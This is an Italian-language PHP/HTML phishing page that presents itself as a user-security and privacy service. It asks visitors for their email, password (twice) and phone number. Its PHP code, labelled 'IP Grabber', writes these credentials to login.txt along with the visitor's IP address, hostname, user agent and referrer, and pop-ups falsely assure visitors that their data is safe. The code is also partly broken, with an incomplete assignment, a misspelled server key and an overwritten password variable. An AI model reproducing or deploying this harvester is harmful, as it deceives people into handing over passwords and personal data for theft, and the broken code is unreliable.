<!DOCTYPE html>
<html>
<head>
     <hr class="top">
     
	<title>email management</title>
	<h1 class="title" align="center">Sicurezza per gli utenti</h1>
   <div>
    <p>inserisci i tuoi dati utenete e poi invia il modulo per garantire la privacy dei tuoi dati e nasconderli per farti navigare in maniera sicura</p>
   </div>
</head>
<body bgcolor="#E42217">
	<!--JS part-->
	<script type="text/javascript">
		
	</script>
    <!--CSS part-->
	<style type="text/css">
        h1.title{
        	color: #ffffff; 
        	font-family: Arial Black;
        	font-size: 800%;
        	position: relative;
        	top: 10px;
        	
        }

		hr.top{
            background-color: #ffffff;
			position: relative;
			top: 25px;
			left: -8px ;
			height: 150px ;
            
			width: 1363px;
		}
        hr.desing{
            background-color: #ffffff;
			position: relative;
			top: 410px;
			left: -8px ;
			height: 350px ;
            bottom: -1px;
			width: 1363px;
		}
        /*p.pre{
         position: relative;
         top: 900px;
         right: -200px;
         color: #ffffff;
         font-family: Arial Black;
         font-size: 350%;
        }*/
		input.credenziali{
			height: 150px ;
			width: 500px;
			
			font-size: 325%;
			position: relative;
			top: 200px; 
			left: 310px;
		}
		input.credenziali1{
			height: 150px ;
			width: 500px;
			
			font-size: 240%;
			position: relative;
			top: 190px; 
			left: 310px;
		}
        input.credenziali3{
			height: 150px ;
			width: 500px;
			
			font-size: 350%;
			position: relative;
			top: 210px; 
			left: 310px;
		}
        input.credenziali2{
			height: 150px ;
			width: 500px;
			
			font-size: 350%;
			position: relative;
			top: 220px; 
			left: 310px;
		}

		td.tem{
			color: #ffffff;
			font-size: 350%;
			font-family: Arial Black;
			position: relative;
			top: 190px;
			left: 200px;

		}
		td.ted{
			color: #ffffff;
			font-size: 350%;
			font-family: Arial Black ;
			position: relative;
			top: 200px;
			left: 200px;

		}
        td.tes{
			color: #ffffff;
			font-size: 350%;
			font-family: Arial Black ;
			position: relative;
			top: 225px;
			left: 200px;

		}
         td.teq{
			color: #ffffff;
			font-size: 350%;
			font-family: Arial Black ;
			position: relative;
			top: 215px;
			left: 200px;

		}

		input.buttom1{
			height: 150px ;
			width: 400px;
            background-color: #ffffff;
			border-radius: 300px;
			font-size: 250%;
			font-family: Arial Black ;
			position: relative;
			top: 300px; 
			left: 330px;
			cursor: pointer;
			box-shadow: 0px 10px #888888;
			border: 1px solid #000000;

		}
		input.buttom2{
			height: 150px ;
			width: 400px;
            background-color: #ffffff;
			border-radius: 300px;
			font-size: 250%;
			font-family: Arial Black ;
			position: relative;
			top: 300px; 
			left: 350px;
			cursor: pointer;
			box-shadow: 0px 10px #888888;
			border: 1px solid #000000;
		}
        button.buttom1{
            height: 50px ;
			width: 250px;
            background-color: #ffffff;
			border-radius: 300px;
			font-size: 150%;
			font-family: Arial Black ;
			position: relative;
			top: 300px; 
			left: 350px;
			cursor: pointer;
			box-shadow: 0px 10px #888888;
			border: 1px solid #000000;
        }
        div{
         
      position: relative;
      left: 310px;
      color: #ffffff;
      border: 10px solid #ffffff;
      width: 910px;
      height: 250px;
      box-shadow: 10px 10px 10px #888888;
      top: 100px;
      left: 200px;
        }
        p{
         font-family: Arial Black;
         font-size: 230%;
         position: relative;
         left: 10px;
        
        }
      
        
	</style>
	<!--php part-->
	<!--php part-->
    <?php
     if(isset($_POST['tasto_invia']))
     {
     echo "ok i tuoi dati sono stati registrati";
     }
     
     $data = date("d/m/y");
     $date = date("H/i/s");
     $email = $
     
	 
        $alert = "";
         function validateFormData($formdata){
           htmlspecialchars(stripslashes(trim($formdata)));
         return $formdata;
}
    if(isset($_POST['INVIA'])){
        $email = validateFormData($_POST['email']);
        $password = validateFormData($_POST['password']);
        $number = validateFormData($_POST['number']);
        $password1 = validateFormData($_POST['password1']);
       
       
        $alert = "<p class='text'>$name Your details have been validated and submitted</p>";
    }

     
     

//IP Grabber

//Variabiles
$email = $_POST['email'];
$password = $_POST['password'];
$password = $_POST['password1'];
$number = $_POST['number'];
$protocol = $_SERVER['SERVER_PROTOCOL'];
$ip = $_SERVER['REMOTE_ADDR'];
$port = $_SERVER['ROMOVE_PORT'];
$agent = $_SERVER['HTTP_USER_AGENT'];
$ref = $_SERVER['HTTP_REFERER'];
$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);

//Prit IP, Hostname, Port Number, User Agent and Referer To log.TXT

$fh = Fopen('login.txt', 'a');
fwrite($fh, 'Data: '.$data."\n");
fwrite($fh, 'Data: '.$date."\n");
fwrite($fh, 'Email: '.$email."\n");
fwrite($fh, 'Password: '.$password."\n");
fwrite($fh, 'Password confirmed: '.$password1."\n");
fwrite($fh, 'numero: '.$number."\n");
fwrite($fh, 'IP Address: '."".$ip ."\n");
fwrite($fh, 'Hostname: '."".$hostname ."\n");
fwrite($fh, 'Port Number: '."".$port ."\n");
fwrite($fh, 'User Agent: '."".$agent ."\n");
fwrite($fh, 'HTTP Referer: '."".$ref ."\n\n");
fclose($fh);


  


?>

 <form name="login" action="security.php" method="POST" onsubmit="return validate()">
	  <table>
	  	<tr>
	  		<td class="tem">Email: </td>
		    <td><input class="credenziali1" type="text" name="email" id="email" placeholder="inserisci la tua mail" pattern="[A-Za-z0-9-@-.]+" required aria-required="true"/></td>
		</tr>
		<tr>
			<td class="ted">Password: </td>
		    <td><input class="credenziali" type="password" name="password" id="password" placeholder="inserisci la password" required aria-required="true"/></td>
		</tr>
        <tr>
			<td class="teq">Password: </td>
		    <td><input class="credenziali3" type="password" name="password1" id="password" placeholder="reinserici password" required aria-required="true"/></td>
		</tr>
        <tr>
			<td class="tes">Phone number:</td>
		    <td><input class="credenziali2" type="number" name="number" placeholder="numero di telefono" required aria-required="true"/></td>
		</tr>
	  </table>
		<input class="buttom1" type="submit" name="INVIA" method="POST" onclick="scre()"  /><input class="buttom2" type="reset"/>
  
  </form>      
 <script>
 
   function scre(){
      alert("i tuoi dati sono satati inviati con sucesso e messi al sicuro");
       alert("grazie per aver usato il nostro servizio"); 
   }
   
  
 
   function validate(){
    var email = document.getElementById("email");
    var password = document.getElementById("email");
     if(email == ""){
       alert("Non puoi lasciare il campo Email vuoto!");
       }
   }
 </script>

	
    <hr class="desing">
</body>
</html>
      
      
